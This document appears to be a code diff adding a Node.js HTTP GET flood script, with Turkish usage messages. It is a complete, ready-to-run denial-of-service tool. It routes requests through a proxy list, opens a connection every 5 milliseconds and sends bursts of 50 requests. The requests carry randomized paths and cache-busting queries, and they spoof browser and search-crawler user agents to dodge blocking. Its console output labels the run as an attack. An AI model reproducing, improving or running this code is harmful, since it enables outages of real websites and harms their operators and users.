@@ -1,0 +1,78 @@
+// httpflood2.js – HTTP GET Flood (proxy ile)
+// Kullanım: node httpflood2.js <url> <süre>
+
+process.on('uncaughtException', function() {});
+process.on('unhandledRejection', function() {});
+const net = require('net');
+const fs = require('fs');
+const url = require('url');
+
+if (process.argv.length < 4) {
+    console.log('Kullanım: node httpflood2.js <url> <süre>');
+    console.log('Örnek: node httpflood2.js https://example.com 60');
+    process.exit(0);
+}
+
+const target = process.argv[2];
+const duration = parseInt(process.argv[3]) || 60;
+const parsed = url.parse(target);
+const proxyFile = "proxy.txt";
+
+let proxies = [];
+if (fs.existsSync(proxyFile)) {
+    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(p => p.trim());
+} else {
+    console.log('[!] proxy.txt bulunamadı!');
+    process.exit(1);
+}
+
+const UAs = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/118.0.2088.88",
+    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 EdgA/118.0.2088.66",
+    "Googlebot/2.1 (+http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+];
+
+const paths = [
+    '/', '/home', '/about', '/faq', '/terms', '/team', '/services',
+    '/portfolio', '/careers', '/events', '/download', '/press',
+    '/testimonials', '/resources', '/donate', '/community', '/newsletter'
+];
+const cookies = [
+    'PHPSESSID=abc123; mysid=def456',
+    'session_id=xyz789; token=abc123',
+    '_ga=GA1.2.123456789.1234567890; _gid=GA1.2.987654321.1234567890'
+];
+
+function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+setTimeout(() => process.exit(7), duration * 1000);
+
+setInterval(function() {
+    const proxyStr = randomElement(proxies);
+    const proxy = proxyStr.split(':');
+    if (proxy.length < 2) return;
+    const socket = net.connect(parseInt(proxy[1]), proxy[0]);
+    socket.setKeepAlive(true, 5000);
+    socket.setTimeout(5000);
+    socket.once('error', () => {});
+    socket.once('connect', () => {
+        for (let j = 0; j < 50; j++) {
+            const path = randomElement(paths) + '?' + Math.random().toString(36).substring(2, 8);
+            const ua = randomElement(UAs);
+            const cookie = randomElement(cookies);
+            const req = `GET ${path} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: ${ua}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nCookie: ${cookie}\r\nConnection: keep-alive\r\n\r\n`;
+            socket.write(req);
+        }
+        setTimeout(() => socket.destroy(), 5000);
+    });
+    socket.once('timeout', () => socket.destroy());
+    socket.once('error', () => socket.destroy());
+}, 5);
+
+console.log(`[+] Saldırı başlatıldı: ${target} (${duration}s)`);
+console.log(`[+] Proxy sayısı: ${proxies.length}`);
